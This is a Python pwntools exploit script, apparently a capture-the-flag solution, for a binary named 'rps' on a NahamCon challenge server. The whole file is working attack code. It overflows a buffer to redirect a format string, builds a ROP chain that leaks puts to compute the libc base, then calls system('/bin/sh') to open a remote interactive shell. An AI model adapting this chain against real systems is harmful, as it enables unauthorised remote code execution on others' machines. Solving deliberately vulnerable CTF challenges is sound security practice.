#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('rps')
libc = ELF("./libc-2.31.so")
# p = process(elf.path)

# changes on starting challenge
p = remote("challenge.nahamcon.com", 31524)

# gdb.attach(p, 'init-gef')

buf_overflow_fmt_str_location = 0x402008
play_rps = 0x00401317

# context.log_level = "debug"

def play():
    p.sendlineafter("> ", '1')

p.sendlineafter('[y/n]: ', 'y')

play()

payload = "yes\n\x00".ljust(0x18, "A")

payload += p32(buf_overflow_fmt_str_location)[:2]

log.info(repr(payload))

p.sendafter("]: ", payload)

# pause()

pop_rdi = 0x0000000000401513

padding = "A" * 20
ropchain = padding
ropchain += flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    play_rps
)

p.sendlineafter("> ", ropchain)

p.sendafter("]: ", "no\n\x00")

puts = u64(p.recvline(False).ljust(8, '\x00'))
libc.address = puts - libc.symbols['puts']

log.info("Libc: 0x{:x}".format(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search("/bin/sh"))

ret = 0x000000000040101a

ropchain = padding
ropchain += flat(
    pop_rdi, bin_sh,
    ret,
    system
)

p.sendlineafter("> ", ropchain)
p.sendafter("]: ", "no\n\x00")


p.interactive()
